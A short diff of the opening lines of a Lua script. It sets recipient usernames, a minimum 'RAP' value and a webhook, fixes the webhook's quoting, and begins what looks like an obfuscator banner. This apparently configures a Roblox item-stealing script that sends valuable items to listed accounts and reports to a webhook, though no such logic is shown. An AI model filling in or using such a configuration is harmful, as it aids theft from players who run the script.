@@ -1,6 +1,6 @@
 _G.Usernames = {"user1"} 
 _G.minrap = 10000000
-_G.webhook = "{"webhook1"}"
+_G.webhook = "webhook1"
 
 --[[
  .____                  ________ ___.    _____                           __                
